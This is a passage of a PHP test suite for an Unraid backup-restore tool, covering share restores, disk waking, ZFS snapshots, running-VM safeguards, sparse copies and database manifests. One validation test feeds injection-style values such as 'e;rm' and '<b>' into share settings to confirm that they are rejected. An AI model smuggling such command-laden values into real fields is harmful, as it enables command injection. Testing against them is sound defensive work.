    $c = $ctx;
    $p = rsPlanFilesFor('/mnt/user/zzdrop/texts', 'name:hive-only', 'swap', false, $owner, $stamp, $c);
    $un = array_values(array_filter($p['notes'], fn ($n) => $n['key'] === 'note.files_uncovered'))[0] ?? [];
    same('restore shares: a part with content the moment doesn\'t cover', ['mother', 'texts', true], [$un['params']['bases'] ?? null, $un['params']['names'] ?? null, $un['warn'] ?? null]);
    $c = $ctx;
    same('restore shares: a moment that holds nothing of it', ['restore_not_in_snapshot'],
        array_column(rsPlanFilesFor('/mnt/user/zzdrop/texts', 'name:uso-plan-test-20261006-1500', 'copy', false, $owner, $stamp, $c)['blockers'], 'key'));
    $c = $ctx;
    $c['asleep'] = ['mother' => true];
    same('restore shares: a part asleep — through /mnt/user only with «wake»', ['restore_asleep'],
        array_column(rsPlanFilesFor('/mnt/user/zzdrop/texts', 'name:manual-x', 'copy', false, $owner, $stamp, $c)['blockers'], 'key'));
    $c = $ctx;
    $c['asleep'] = ['hive' => true];
    $p = rsPlanFilesFor('/mnt/user/zzdrop', '', '', false, $owner, $stamp, $c);
    same('restore shares: the part holding the data asleep — «wake», never "nothing there"', [['restore_asleep'], ['hive'], ['mother', 'disk1']],
        [array_column($p['blockers'], 'key'), $p['options']['asleep'], array_values(array_unique(array_merge(...array_column($p['options']['moments'], 'bases'))))]);
    $c = $ctx;
    $c['asleep'] = ['hive' => true];
    $p = rsPlanFilesFor('/mnt/user/zzdrop', '', '', true, $owner, $stamp, $c);
    same('restore shares: with «wake» it is looked into', ['name:manual-x', []], [$p['target']['snap'], array_column($p['blockers'], 'key')]);

    // «wake» really wakes the sleeping parts first (a block read from each of their disks, waited for), only those, only when ticked
    $woke = [];
    $GLOBALS['rs']['wake_run'] = function (array $commands) use (&$woke): array {
        $woke[] = $commands;
        return array_map(fn ($cmd) => [0, '', ''], $commands);
    };
    $disks = ['hive' => ['name' => 'hive', 'device' => 'null', 'spundown' => '1', 'fsFree' => '1000000'], 'hive2' => ['name' => 'hive2', 'device' => 'null', 'spundown' => '0'],
              'mother' => ['name' => 'mother', 'device' => 'null', 'spundown' => '0', 'fsFree' => '500000'], 'disk1' => ['name' => 'disk1', 'device' => 'null', 'fsFree' => '7']];
    $c = $ctx;
    $c['disks'] = $disks;
    $c['asleep'] = ['hive' => true, 'hive2' => false, 'mother' => false];
    $p = rsPlanFilesFor('/mnt/user/zzdrop', '', '', false, $owner, $stamp, $c);
    same('restore shares: without «wake» no disk is woken', [[], ['restore_asleep']], [$woke, array_column($p['blockers'], 'key')]);
    $c = $ctx;
    $c['disks'] = $disks;
    $c['asleep'] = ['hive' => true, 'hive2' => false, 'mother' => false];
    $p = rsPlanFilesFor('/mnt/user/zzdrop', '', 'swap', true, $owner, $stamp, $c, ['files', 'texts']);
    same('restore shares: «wake» wakes every disk of the sleeping pool, nothing else', [['hive', 'hive2']], array_map('array_keys', $woke));
    same('restore shares: the dd read of one block', ['dd', 'if=/dev/null', 'of=/dev/null', 'bs=4096', 'count=1', 'iflag=direct'], $woke[0]['hive'] ?? null);
    same('restore shares: woken, then its moments and the choices kept', [['woken' => ['hive'], 'failed' => []], [], ['hive'], 'name:manual-x', ['files', 'texts'], 'swap', []],
        [$p['woke'], $p['options']['asleep'], $p['options']['woken'], $p['target']['snap'], $p['target']['items'], $p['target']['mode'], array_column($p['blockers'], 'key')]);
    $woke = [];
    $GLOBALS['rs']['wake_run'] = function (array $commands) use (&$woke): array {
        $woke[] = $commands;
        return array_map(fn ($cmd) => [1, '', 'timeout'], $commands);
    };
    $c = $ctx;
    $c['disks'] = $disks;
    $c['asleep'] = ['hive' => true, 'hive2' => false, 'mother' => false];
    $p = rsPlanFilesFor('/mnt/user/zzdrop', '', '', true, $owner, $stamp, $c);
    same('restore shares: a disk that doesn\'t answer stays asleep — said so, never read', [['woken' => [], 'failed' => ['hive']], ['hive'], ['restore_wake_failed'], ['mother', 'disk1']],
        [$p['woke'], $p['options']['asleep'], array_column($p['blockers'], 'key'), array_values(array_unique(array_merge(...array_column($p['options']['moments'], 'bases'))))]);
    unset($GLOBALS['rs']['wake_run']);
    $c = $ctx;
    same('restore shares: the entries chosen stay when copy is chosen instead', [['files', 'texts'], 'copy'],
        (fn ($p) => [$p['target']['items'], $p['target']['mode']])(rsPlanFilesFor('/mnt/user/zzdrop', 'name:manual-x', 'copy', false, $owner, $stamp, $c, ['texts', 'files'])));
    $c = $ctx;
    $c['fs']['disk2'] = 'xfs';
    $bases = fn (array $cfg) => (function () use ($c, $cfg) { $c['cfg']['zz'] = $cfg; return rsShareBases('zz', $c); })();
    same('restore shares: the array is a part only as primary or secondary storage', [['hive', 'mother'], ['hive', 'disk1', 'disk2'], ['disk1', 'disk2'], ['hive']],
        [$bases(['shareUseCache' => 'prefer', 'shareCachePool' => 'hive', 'shareCachePool2' => 'mother']), $bases(['shareUseCache' => 'yes', 'shareCachePool' => 'hive']),
         $bases(['shareUseCache' => 'no', 'shareCachePool' => 'hive']), $bases(['shareUseCache' => 'only', 'shareCachePool' => 'hive'])]);

    // a share that is gone: never created here — its old settings as information, pools this server lacks named
    $c = $ctx;
    $p = rsPlanFilesFor('/mnt/user/zzgone/x', '', '', false, $owner, $stamp, $c);
    $old = $p['share_now']['old'] ?? [];
    same('restore shares: a missing share blocks, with its old settings', [['restore_share_missing'], 'missing', 'hive', 'zzpool2', 'to_primary', ['zzpool2']],
        [array_column($p['blockers'], 'key'), $p['share_now']['state'], $old['primary'] ?? null, $old['secondary'] ?? null, $old['mover'] ?? null, $old['missing_pools'] ?? null]);
    same('restore shares: the old settings in words', ['mostfree', '1', 2048000, 'hidden', 'private', 'no'],
        [$old['allocator'] ?? null, $old['split'] ?? null, $old['floor'] ?? null, $old['smb'] ?? null, $old['security'] ?? null, $old['nfs'] ?? null]);

    // an empty share: straight in — nothing to put aside, «put in place» by default
    $c = $ctx;
    $p = rsPlanFilesFor('/mnt/user/zzempty', '', '', false, $owner, $stamp, $c);
    same('restore shares: an empty share is filled straight in', ['empty', 'swap', ['copy', 'stop', 'move', 'start'], [], 'after.files_place'],
        [$p['share_now']['state'], $p['target']['mode'], array_column($p['steps'], 'do'), $p['aside'], $p['after'][0]['key'] ?? null]);
    check('restore shares: and says so', in_array('note.files_share_empty', array_column($p['notes'], 'key'), true));
    same('restore shares: an exclusive share is placed on its pool only', ['note.files_place', 'hive'],
        [array_values(array_filter($p['notes'], fn ($n) => str_starts_with($n['key'], 'note.files_place')))[0]['key'] ?? null,
         array_values(array_filter($p['notes'], fn ($n) => str_starts_with($n['key'], 'note.files_place')))[0]['params']['primary'] ?? null]);
    $c = $ctx;
    same('restore shares: too much at the top of a share', [['restore_too_many'], RS_ENTRIES_MAX + 1],
        [array_column(rsPlanFilesFor('/mnt/user/zzmany', '', '', false, $owner, $stamp, $c)['blockers'], 'key'),
         rsPlanFilesFor('/mnt/user/zzmany', '', '', false, $owner, $stamp, $c)['blockers'][0]['params']['n'] ?? null]);

    // the shares an app needs, as they are; settings in words; where Unraid puts it and how much room
    $c = $ctx;
    same('restore shares: the shares as they are', ['data', 'empty', 'missing'], [rsShareNow('zzdrop', $c)['state'], rsShareNow('zzempty', $c)['state'], rsShareNow('zzgone', $c)['state']]);
    $s = fn (array $cfg) => array_intersect_key(rsShareSettings($cfg, $ctx), array_flip(['primary', 'secondary', 'mover']));
    same('restore shares: primary and secondary storage from the cfg', [
            ['primary' => 'array', 'secondary' => null, 'mover' => null], ['primary' => 'hive', 'secondary' => null, 'mover' => null],
            ['primary' => 'hive', 'secondary' => 'array', 'mover' => 'to_secondary'], ['primary' => 'cache', 'secondary' => 'mother', 'mover' => 'to_primary']],
        [$s([]), $s(['shareUseCache' => 'only', 'shareCachePool' => 'hive']), $s(['shareUseCache' => 'yes', 'shareCachePool' => 'hive']),
         $s(['shareUseCache' => 'prefer', 'shareCachePool2' => 'mother'])]);
    same('restore shares: odd values are not taken', ['array', 'no', 'public'],
        array_values(array_intersect_key(rsShareSettings(['shareUseCache' => 'x;y', 'shareSecurity' => '<b>', 'shareExport' => 'e;rm'], $ctx), array_flip(['primary', 'security', 'smb']))));
    $c = $ctx;
    same('restore shares: room on primary and secondary, less the minimum free space', ['hive', 'mother', 999000 * 1024, 499000 * 1024, 1498000 * 1024],
        array_values(rsShareSpace('zzdrop', $c)));

    unset($GLOBALS['rs']['data'], $GLOBALS['rs']['job_file'], $GLOBALS['rs']['ub_data'], $GLOBALS['rs']['sizes_file'], $GLOBALS['rs']['users']);
    $GLOBALS['rs']['du'] = ['queue' => [], 'running' => []];
    exec('rm -rf ' . escapeshellarg($tmp));
}

/**
 * Mr. Restori's findings of 2026-10-06 (a VM's folder in domains, a ZFS dataset of its own): sizes from the source by a
 * du that sees an unmounted ZFS snapshot, allocated and apparent (sparse), ZFS sources counted with their data's own
 * size where the target doesn't compress; an empty folder counts as nothing there («put in place», it goes aside); the
 * snapshots of a dataset he put aside are still offered (and said to stay with it); a folder holding a running VM's
 * disks is never swapped or put back under it (and checked again in the job); rsync keeps sparse files sparse; a
 * journal put back says so and where the restored state went; Kopia's list shows what a snapshot holds. All in a
 * temporary folder, VMs and ZFS as stand-ins.
 */
function testRestoreFindings(): void
{
    $tmp = sys_get_temp_dir() . '/office-tests-rsfind-' . getmypid();
    $mnt = "$tmp/mnt";
    @mkdir("$tmp/data/unraid-backup/state", 0700, true);
    $GLOBALS['rs']['data'] = "$tmp/data/restore";
    $GLOBALS['rs']['job_file'] = "$tmp/data/restore-job.json";
    $GLOBALS['rs']['ub_data'] = "$tmp/data/unraid-backup";
    $GLOBALS['rs']['sizes_file'] = "$tmp/data/restore-sizes.json";
    $GLOBALS['rs']['users'] = fn (array $paths, array $roots): array => [[], []];
    $GLOBALS['rs']['inherited'] = fn (string $ds): bool => true;
    $GLOBALS['rs']['ratios'] = fn (array $snaps): array => array_fill_keys($snaps, 1.25);
    $compresses = false;
    $GLOBALS['rs']['compresses'] = function (string $ds) use (&$compresses): bool { return $compresses; };
    $vmState = 'running';
    $GLOBALS['rs']['vm_disks'] = function () use (&$vmState): array {
        return ['VM1' => ['state' => $vmState, 'disks' => ['/mnt/user/domains/VM1/vdisk1.img']],
                'Other' => ['state' => 'running', 'disks' => ['/mnt/master/domains/Other/vdisk1.img']]];
    };
    $put = function (string $file, ?string $text = null): void {
        @mkdir($text === null ? $file : dirname($file), 0755, true);
        if ($text !== null) {
            file_put_contents($file, $text);
        }
    };
    $T = (int) strtotime('2026-10-06 16:00');
    $aside = "$mnt/master/domains/VM2.aside-20261006-175854";
    // VM1: a dataset of its own, empty now, its snapshot holds the disk; VM2: data now, its old dataset put aside with the snapshot
    $put("$mnt/master/domains/VM1/.zfs/snapshot/uso-backup-20261006-1600/vdisk1.img", 'disk one');
    $put("$mnt/master/domains/VM2/vdisk1.img", 'live two');
    $put("$aside/.zfs/snapshot/uso-backup-20261006-1600/vdisk1.img", 'old two');
    $put("$mnt/user");
    symlink("$mnt/master/domains", "$mnt/user/domains");
    $ctx = [
        'fs' => ['master' => 'zfs'],
        'zfs' => ["$mnt/master/domains" => 'zz-master/domains', "$mnt/master/domains/VM1" => 'zz-master/domains/VM1',
                  "$mnt/master/domains/VM2" => 'zz-master/domains/VM2', $aside => 'zz-master/domains/VM2.aside-20261006-175854'],
        'snaps' => ['zz-master/domains/VM1' => [['name' => 'uso-backup-20261006-1600', 'time' => $T]],
                    'zz-master/domains/VM2.aside-20261006-175854' => [['name' => 'uso-backup-20261006-1600', 'time' => $T]]],
        'asleep' => [], 'prefixes' => ['uso-backup-', 'unraidbackup-'], 'btrfs_dir' => '.btrfs-snap', 'settings' => [],
        'cfg' => ['domains' => ['shareUseCache' => 'only', 'shareCachePool' => 'master']],
        'mnt' => $mnt, 'user' => "$mnt/user", 'disks' => ['master' => ['name' => 'master', 'fsFree' => '1000000000']],
        'shares_ini' => ['domains' => ['exclusive' => 'yes']], 'old_shares' => null, 'now' => [],
    ];
    $owner = ['kind' => 'vm', 'name' => 'VM1', 'id' => 'VM1', 'vm_state' => 'shut off'];
    $stamp = '20261006-190000';
    $src1 = "$mnt/master/domains/VM1/.zfs/snapshot/uso-backup-20261006-1600";

    // 2: an empty folder (here a dataset holding only its .zfs) is nothing there: «put in place» by default, it goes aside
    $c = $ctx;
    $p = rsPlanFilesFor('/mnt/user/domains/VM1', '', '', false, $owner, $stamp, $c);
    $notes = array_column($p['notes'], 'key');
    same('restore findings: an empty folder — put in place by default, as a dataset, the empty one aside',
        [true, 'swap', ['copy', 'vms_off', 'aside', 'move'], 'empty', 'zz-master/domains/VM1.restored-' . $stamp],
        [$p['options']['nothing_live'], $p['target']['mode'], array_column($p['steps'], 'do'), $p['aside'][0]['what'] ?? null, $p['steps'][0]['dataset'] ?? null]);
    check('restore findings: and says so (place, the empty folder aside)', in_array('note.files_place_empty', $notes, true)
        && in_array('after.files_empty_aside', array_column($p['after'], 'key'), true) && ($p['after'][0]['key'] ?? '') === 'after.files_place', json_encode([$notes, $p['after']]));
    // 7: its snapshots go with the dataset put aside — said so
    $snapNote = array_values(array_filter($p['notes'], fn ($n) => $n['key'] === 'note.files_dataset_snaps'))[0] ?? [];
    same('restore findings: the snapshots stay with the dataset put aside — said so', [1, "zz-master/domains/VM1.aside-$stamp", true],
        [$snapNote['params']['n'] ?? null, $snapNote['params']['dataset'] ?? null, $snapNote['warn'] ?? null]);
    // 6: a running VM keeps its disk there — refused, with a reason; the job looks again before replacing anything
    same('restore findings: never under a running VM', [['restore_vm_uses'], 'VM1', 'running', '/mnt/user/domains/VM1/vdisk1.img'],
        [array_values(array_diff(array_column($p['blockers'], 'key'), [])), $p['blockers'][0]['params']['name'] ?? null,
         $p['blockers'][0]['params']['state'] ?? null, $p['blockers'][0]['params']['path'] ?? null]);
    same('restore findings: the job checks the VMs again with every way to the folder',
        [['/mnt/user/domains/VM1', '/mnt/master/domains/VM1'], ['VM1']], [$p['steps'][1]['paths'] ?? null, $p['steps'][1]['names'] ?? null]);
    same('restore findings: a VM elsewhere doesn\'t count', [], array_column(rsVmsUsing(['/mnt/user/domains/VM2']), 'name'));
    same('restore findings: the VM running blocks the step in the job, shut off it passes', ['failed', 'vm_running', 'VM1 (running)'],
        (fn ($r) => [$r['state'], $r['note'] ?? null, $r['params']['names'] ?? null])(rsDoVmsOff($p['steps'][1])));
    $vmState = 'shut off';
    same('restore findings: shut off it passes', 'ok', rsDoVmsOff($p['steps'][1])['state']);
    $c = $ctx;
    $p = rsPlanFilesFor('/mnt/user/domains/VM1', '', '', false, $owner, $stamp, $c);
    same('restore findings: VM shut off — nothing blocks, said to stay off', [[], true],
        [array_column($p['blockers'], 'key'), in_array('note.files_vms_off', array_column($p['notes'], 'key'), true)]);
    $c = $ctx;
    $q = rsPlanFilesFor('/mnt/user/domains/VM1', '', 'copy', false, $owner, $stamp, $c);
    same('restore findings: a copy next to it never asks the VMs (nothing replaced)', [['copy'], []], [array_column($q['steps'], 'do'), $q['blockers']]);

    // 1: the size comes from the source; old entries (the du that said 1 KB) count as not measured; 3: ZFS → its data's size
    same('restore findings: measured from the source, in the background', [true, null, [$src1]], [$p['sizes']['measuring'], $p['sizes']['need'], $p['sizes']['paths']]);
    rsSizesSave([$src1 => ['bytes' => 1024, 'at' => time(), 'seconds' => 0]]);
    $c = $ctx;
    same('restore findings: a size from the old du is measured again', true, rsPlanFilesFor('/mnt/user/domains/VM1', '', '', false, $owner, $stamp, $c)['sizes']['measuring']);
    $g = 1 << 30;
    rsSizesSave([$src1 => ['bytes' => 16 * $g, 'apparent' => 108 * $g, 'at' => time(), 'seconds' => 3]]);
    $c = $ctx;
    $p = rsPlanFilesFor('/mnt/user/domains/VM1', '', '', false, $owner, $stamp, $c);
    same('restore findings: into a target that doesn\'t compress, the data\'s own size; the apparent size beside it',
        [false, 20 * $g, 20 * $g, 108 * $g, [$src1 => 1.25], false],
        [$p['sizes']['measuring'], $p['sizes']['need'], $p['sizes']['logical'], $p['sizes']['apparent'], (array) $p['sizes']['scale'], $p['sizes']['compresses']]);
    $compresses = true;
    $c = $ctx;
    same('restore findings: into a ZFS dataset that compresses, what it takes there', 16 * $g, rsPlanFilesFor('/mnt/user/domains/VM1', '', '', false, $owner, $stamp, $c)['sizes']['need']);

    // 7: the snapshots of a dataset put aside are still offered for the folder, as what they are
    $c = $ctx;
    $owner2 = ['kind' => 'vm', 'name' => 'VM2', 'id' => 'VM2', 'vm_state' => 'shut off'];
    $p = rsPlanFilesFor('/mnt/user/domains/VM2', '', '', false, $owner2, $stamp, $c);
    $mid = 'aside:VM2.aside-20261006-175854@uso-backup-20261006-1600';
    same('restore findings: the snapshot of the dataset put aside is a moment of its own (data there: copy)',
        [[$mid], $aside, $mid, 'copy', ["$aside/.zfs/snapshot/uso-backup-20261006-1600"], true],
        [array_column($p['options']['moments'], 'id'), $p['options']['moments'][0]['aside'] ?? null, $p['target']['snap'], $p['target']['mode'],
         $p['steps'][0]['sources'] ?? null, in_array('note.files_from_aside', array_column($p['notes'], 'key'), true)]);
    same('restore findings: counted for the folder\'s row', 1, rsFolder('/mnt/user/domains/VM2', [], $c)['snaps']);
    // a backup run after it went aside snapshots the leftover too: that one holds no state of the folder — never offered
    $put("$aside/.zfs/snapshot/uso-backup-20261006-1828/leftover.txt", 'empty leftover');
    $c = $ctx;
    $c['snaps']['zz-master/domains/VM2.aside-20261006-175854'][] = ['name' => 'uso-backup-20261006-1828', 'time' => (int) strtotime('2026-10-06 18:31')];
    same('restore findings: a snapshot of the folder put aside taken after it went aside is left out',
        [[$mid], 1], [array_column(rsPlanFilesFor('/mnt/user/domains/VM2', '', '', false, $owner2, $stamp, $c)['options']['moments'], 'id'),
                      rsFolder('/mnt/user/domains/VM2', [], $c)['snaps']]);

    // 1: du sees an unmounted ZFS snapshot (it looks inside: <path>/.), allocated and apparent of a sparse file
    same('restore findings: du looks inside a folder, apparent on request',
        [['nice', '-n', '10', 'du', '-s', '-B1', '-x', "$src1/."], ['nice', '-n', '10', 'du', '-s', '-B1', '-x', '--apparent-size', "$src1/vdisk1.img"]],
        [rsDuCommand($src1, false), rsDuCommand("$src1/vdisk1.img", true)]);
    $sp = "$tmp/sparse";
    $put("$sp/disk.img", str_repeat('x', 65536));
    $h = fopen("$sp/disk.img", 'r+');
    ftruncate($h, 64 << 20);
    fclose($h);
    $GLOBALS['rs']['du'] = ['queue' => [], 'running' => []];
    rsDuQueue($sp);
    for ($i = 0; $i < 100 && (rsSizeOf(rsSizes(), $sp) === null); $i++) {
        rsDuTick();
        usleep(50000);
    }
    $m = rsSizeOf(rsSizes(), $sp);
    check('restore findings: the background du measures allocated and apparent', $m !== null && $m['bytes'] < (8 << 20) && $m['apparent'] >= (64 << 20), json_encode($m));

    // 3: rsync keeps sparse files sparse
    $id = "$stamp-ab12";
    rsPrivateDir(rsData());
    rsPrivateDir(rsDir($id));
    $j = rsJournalNew($id, rsPlanBase('files', 'zz', []) + ['stamp' => $stamp]);
    $j['steps'] = [['do' => 'copy', 'from' => $sp, 'sources' => [$sp], 'to' => "$tmp/copy", 'state' => 'running']];
    $r = rsStep($j, 0);
    clearstatcache();
    $st = @stat("$tmp/copy/disk.img");
    check('restore findings: the copy keeps the sparse file sparse', $r['state'] === 'ok' && $st && $st['size'] === (64 << 20) && $st['blocks'] * 512 < (8 << 20),
        json_encode([$r, $st ? [$st['size'], $st['blocks']] : null]));

    // 6: «Put back» of such a restore — never under a running VM, the VMs checked again first
    $vmState = 'running';
    $jid = '20261006-180000-cd34';
    rsPrivateDir(rsDir($jid));
    $jr = rsJournalNew($jid, rsPlanBase('files', 'VM1', ['path' => '/mnt/user/domains/VM1']) + ['stamp' => '20261006-180000']);
    $jr['result'] = 'ok';
    $jr['steps'] = [['do' => 'aside', 'state' => 'ok', 'undo' => [
        ['do' => 'aside', 'path' => '/mnt/master/domains/VM1', 'to' => '/mnt/master/domains/VM1.putback-{T}', 'optional' => true],
        ['do' => 'move', 'from' => '/mnt/master/domains/VM1.aside-20261006-180000', 'to' => '/mnt/master/domains/VM1']]]];   // only planned, never run
    writeAtomic(rsDir($jid) . '/plan.json', jsonEncode(rsPlanBase('files', 'VM1', []) + ['stamp' => '20261006-180000']), 0600, 0, 0);
    rsJournalWrite($jr, false);
    $GLOBALS['rs']['vm_disks'] = fn (): array => ['VM1' => ['state' => 'running', 'disks' => ['/mnt/master/domains/VM1/vdisk1.img']]];
    $b = rsPlanPutback(['id' => $jid], '20261006-200000');
    check('restore findings: a put back under a running VM is refused, its VMs checked first',
        in_array('restore_vm_uses', array_column($b['blockers'], 'key'), true) && ($b['steps'][0]['do'] ?? '') === 'vms_off', json_encode([$b['blockers'], $b['steps']]));
    same('restore findings: VM disks found by any way to them', [['VM1'], []],
        [array_column(rsVmsUsing(['/mnt/user/domains/VM1']), 'name'), rsVmsUsing(['/mnt/disks/x/domains/VM1', '/boot/config'])]);

    // 5: a journal put back: when, where the restored state went, its put back's entry
    $pid = '20261006-200000-ef56';
    rsPrivateDir(rsDir($pid));
    $pj = rsJournalNew($pid, rsPlanBase('putback', 'VM1', ['id' => $jid]) + ['stamp' => '20261006-200000']);
    $pj['result'] = 'ok';
    $pj['finished'] = 1791300000;
    $pj['aside'] = [['from' => "$mnt/master/domains/VM1", 'to' => "$mnt/master/domains/VM1.putback-20261006-200000"]];
    rsJournalWrite($pj, false);
    rsMarkPutback($jid, $pid, 'ok');
    $row = rsJournalRow(rsJournal($jid));
    same('restore findings: the journal says it was put back, when, and where the restored state went',
        [$pid, 'ok', 1791300000, ["$mnt/master/domains/VM1.putback-20261006-200000"], false],
        [$row['putback']['id'] ?? null, $row['putback']['result'] ?? null, $row['putback']['finished'] ?? null, array_column($row['putback']['aside'] ?? [], 'to'), $row['can_putback']]);

    // 8: Kopia's list shows what a snapshot holds (rootEntry.summ), not the files read anew in that run
    $k = rsKopiaParse(json_encode([['id' => '0123456789abcdef0123456789abcdef', 'startTime' => '2026-10-05T23:17:22Z',
        'stats' => ['totalSize' => 28788869, 'fileCount' => 2, 'cachedFiles' => 801, 'nonCachedFiles' => 2, 'dirCount' => 187],
        'rootEntry' => ['summ' => ['size' => 28788869, 'files' => 803, 'dirs' => 187, 'numFailed' => 0]]],
        ['id' => 'abcdef0123456789abcdef0123456789', 'startTime' => '2026-10-04T23:17:22Z',
         'stats' => ['totalSize' => 5, 'fileCount' => 2, 'cachedFiles' => 7, 'nonCachedFiles' => 2]]]));
    same('restore findings: Kopia — what the snapshot holds (old ones: cached + read anew)', [[803, 187, 28788869, 0], [9, null, 5, 0]],
        array_map(fn ($x) => [$x['files'], $x['dirs'], $x['bytes'], $x['failed']], $k));

    // the page sums sizes the same way, under node
    $node = trim((string) shell_exec('command -v node 2>/dev/null')) ?: (is_executable('/usr/local/bin/node') ? '/usr/local/bin/node' : '');
    if ($node === '') {
        check('restore findings page: node is missing here - skipped', true);
    } else {
        $js = <<<'JS'
const fs = require('fs');
globalThis.OFFICE_DESK_TESTS = {};
const T = (k, p) => k + (p ? ' ' + JSON.stringify(p) : '');
globalThis.Office = { scope: () => T, t: T, el: () => ({}), store: () => null, desk: () => {}, has: () => false, fmt: {} };
(0, eval)(fs.readFileSync(process.argv[2], 'utf8'));
const r = OFFICE_DESK_TESTS.restore;
const sizes = { measuring: true, need: null, paths: ['/a', '/b'], scale: { '/a': 1.25 }, compresses: false, free: 100 };
const map = { '/a': { bytes: 1000, apparent: 9000 }, '/b': { bytes: 10, apparent: 10 } };
console.log(JSON.stringify([r.sizesDone(sizes, map), r.sizesDone({ ...sizes, compresses: true }, map),
  r.sizesDone(sizes, { '/a': { bytes: 1024 }, '/b': map['/b'] })]));
JS;
        file_put_contents("$tmp/t.js", $js);
        $raw = (string) shell_exec(escapeshellarg($node) . ' ' . escapeshellarg("$tmp/t.js") . ' ' . escapeshellarg(OFFICE_WEB . '/desks/restore/desk.js') . ' 2>&1');
        $o = json_decode($raw, true);
        same('restore findings page: sizes summed like the agent (scaled where the target doesn\'t compress, apparent, old entries not measured)',
            [[1260, 1260, 9010, false], 1010, null],
            is_array($o) ? [[$o[0]['need'] ?? null, $o[0]['logical'] ?? null, $o[0]['apparent'] ?? null, $o[0]['measuring'] ?? null], $o[1]['need'] ?? null, $o[2]] : $raw);
    }

    unset($GLOBALS['rs']['data'], $GLOBALS['rs']['job_file'], $GLOBALS['rs']['ub_data'], $GLOBALS['rs']['sizes_file'], $GLOBALS['rs']['users'],
          $GLOBALS['rs']['inherited'], $GLOBALS['rs']['ratios'], $GLOBALS['rs']['compresses'], $GLOBALS['rs']['vm_disks']);
    $GLOBALS['rs']['du'] = ['queue' => [], 'running' => []];
    exec('rm -rf ' . escapeshellarg($tmp));
}

/**
 * Mr. Restori's databases tile: the dumps and the media servers' SQLite copies of every package (in the shapes of
 * nostromo's real manifests, engine 2.20), earlier nights' copies from the backup place's snapshots (the SQLite
 * copies too), where a package is kept; then the page's list under node — per app, one media server's copies as one
 * entry, names, the tile's line («none» too), each earlier night once and never the one listed, the requests
 * «Restore…» sends (the existing kinds db / sqlite). Everything in a temporary folder.
 */
function testRestoreDatabases(): void
{
    $tmp = sys_get_temp_dir() . '/office-tests-rsdb-' . getmypid();
    $put = function (string $file, mixed $data) use ($tmp): void {
        @mkdir(dirname("$tmp/$file"), 0700, true);
        file_put_contents("$tmp/$file", is_string($data) ? $data : json_encode($data));
    };
    $f = fn (string $path, int $bytes, string $run, string $what, string $c = '') => ['path' => $path, 'bytes' => $bytes, 'run' => $run, 'what' => $what, 'container' => $c];
    $mdb = 'db/mariadb_zz-uso-test-db-mdb_usotest.sql.gz';
    $pg = 'db/postgres_zz-uso-test-db-pg.sql.gz';
    $testdb = fn (string $run, string $mdbRun, int $mdbBytes, string $pgRun, int $pgBytes) => ['interface' => 1, 'engine' => '2.20', 'kind' => 'app', 'type' => 'compose',
        'name' => 'zz-uso-test-db', 'folder' => 'zz-uso-test-db', 'run' => $run, 'result' => 'ok',
        'compose' => ['project' => 'zz-uso-test-db', 'manager_dir' => null, 'working_dir' => '/mnt/user/appdata/zz-uso-test-db', 'config_files' => ['/mnt/user/appdata/zz-uso-test-db/compose.yaml']],
        'containers' => [['name' => 'zz-uso-test-db-mdb', 'image' => 'mariadb:11', 'digests' => ['mariadb@sha256:64'], 'running' => true, 'service' => 'mdb', 'template' => null],
                         ['name' => 'zz-uso-test-db-pg', 'image' => 'postgres:16-alpine', 'digests' => ['postgres@sha256:72'], 'running' => true, 'service' => 'pg', 'template' => null]],
        'dumps' => [['container' => 'zz-uso-test-db-mdb', 'type' => 'mariadb', 'state' => 'ok', 'login' => 'root', 'user_var' => '', 'password_var' => 'MARIADB_ROOT_PASSWORD', 'client' => 'mariadb'],
                    ['container' => 'zz-uso-test-db-pg', 'type' => 'postgres', 'state' => 'ok', 'login' => 'user', 'user_var' => 'POSTGRES_USER', 'password_var' => 'POSTGRES_PASSWORD', 'client' => 'psql']],
        'nextcloud' => [], 'sqlite' => [], 'own_backups' => [],
        'files' => [$f('compose-files/compose.yaml', 759, $run, 'compose'), $f($mdb, $mdbBytes, $mdbRun, 'dump', 'zz-uso-test-db-mdb'), $f($pg, $pgBytes, $pgRun, 'dump', 'zz-uso-test-db-pg')]];
    $copy = fn (string $name, bool $present = true) => ['container' => 'EmbyServer', 'file' => "db/sqlite_EmbyServer_$name", 'source' => "/mnt/user/appdata/EmbyServer/data/$name",
        'path' => "/config/data/$name", 'state' => 'ok', 'check' => 'ok', 'present' => $present];
    $emby = fn (string $run, int $lib) => ['interface' => 1, 'kind' => 'app', 'type' => 'template', 'name' => 'EmbyServer', 'run' => $run, 'result' => 'ok',
        'containers' => [['name' => 'EmbyServer', 'image' => 'emby/embyserver:latest', 'template' => 'my-EmbyServer.xml']],
        'dumps' => [], 'sqlite' => [$copy('library.db'), $copy('users.db'), $copy('authentication.db', false)],
        'own_backups' => [['kind' => 'emby', 'container' => 'EmbyServer', 'path' => '/mnt/user/Backups/EmbyServer', 'files' => 0, 'newest' => 0, 'asleep' => false]],
        'files' => [$f('my-EmbyServer.xml', 9, $run, 'template'), $f('db/sqlite_EmbyServer_library.db', $lib, $run, 'sqlite', 'EmbyServer'),
                    $f('db/sqlite_EmbyServer_users.db', 40960, $run, 'sqlite', 'EmbyServer')]];
    $chat = ['kind' => 'app', 'type' => 'template', 'name' => 'chat', 'run' => '20261006-1600',
        'containers' => [['name' => 'chat-mongo', 'image' => 'mongo:7']],
        'dumps' => [['container' => 'chat-mongo', 'type' => 'mongodb', 'state' => 'failed', 'login' => 'none']],
        'files' => [$f('db/mongodb_chat-mongo.archive.gz', 500, '20261005-1600', 'dump', 'chat-mongo')]];
    $web = ['kind' => 'app', 'type' => 'template', 'name' => 'web', 'run' => '20261006-1600', 'containers' => [['name' => 'web', 'image' => 'nginx']], 'dumps' => [], 'sqlite' => [], 'files' => []];
    // tonight's packages (and the snapshot taken right after), an earlier night where Postgres's dump failed (kept), the night before
    foreach (['place', 'snapNew'] as $root) {
        $put("$root/server/run.json", ['run' => '20261006-1600', 'result' => 'ok', 'files' => []]);
        $put("$root/apps/zz-uso-test-db/manifest.json", $testdb('20261006-1600', '20261006-1600', 1405, '20261006-1600', 2291));
        $put("$root/apps/EmbyServer/manifest.json", $emby('20261006-1600', 414433280));
        $put("$root/apps/chat/manifest.json", $chat);
        $put("$root/apps/web/manifest.json", $web);
    }
    $put('snapB/apps/zz-uso-test-db/manifest.json', $testdb('20261006-0200', '20261006-0200', 1390, '20261005-1600', 2200));
    $put('snapB/apps/EmbyServer/manifest.json', $emby('20261005-1600', 414000000));
    $put('snapA/apps/zz-uso-test-db/manifest.json', $testdb('20261005-1600', '20261005-1600', 1300, '20261005-1600', 2200));
